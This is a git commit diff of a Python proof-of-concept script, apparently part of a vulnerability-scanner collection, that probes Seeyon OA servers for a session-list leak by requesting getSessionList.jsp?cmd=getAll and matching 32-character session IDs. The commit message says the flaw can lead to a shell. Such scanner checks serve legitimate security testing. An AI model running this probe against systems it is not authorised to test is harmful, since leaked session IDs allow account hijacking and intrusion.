1c272cd438ce5a79295e4f3d1b357612546b7494
tr0uble_mAker <71172892+tr0uble-mAker@users.noreply.github.com>
2022-07-13 13:54:09 +0800

    修复POC  致远OA Session泄漏漏洞(后台可getshell)

--- pocs/web/seeyon/seeyon_get_sessionslist.py
+++ pocs/web/seeyon/seeyon_get_sessionslist.py
@@ -1,22 +1,26 @@
 import requests,re
 import urllib
 
-
 def verify(url):
     relsult = {
         'name': '致远OA Session泄漏漏洞(后台可getshell)',
-        'vulnerable': False
+        'url': url,
+        'vulnerable': False,
+        'attack': False,
+        'about': 'https://www.zhihuifly.com/t/topic/3345, https://www.seebug.org/vuldb/ssvid-93312'
     }
-    payload1 = '/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
+    timeout = 3
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
+    }
+    payload = '/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
+    vurl = urllib.parse.urljoin(url, payload)
     try:
-        req1 = requests.get(payload1, timeout=3)
-        if req1.status_code == 200 and re.search('[0-9A-Z]{32}', req1.text):
+        req = requests.get(vurl, headers=headers, timeout=timeout)
+        if req.status_code == 200 and re.search('[0-9A-Z]{32}', req.text):
             relsult['vulnerable'] = True
-            relsult['url'] = url
-            relsult['payload'] = payload1
-            relsult['about'] = 'https://www.zhihuifly.com/t/topic/3345, https://www.seebug.org/vuldb/ssvid-93312'
+            relsult['vurl'] = vurl
         return relsult
     except:
         return relsult
-
 
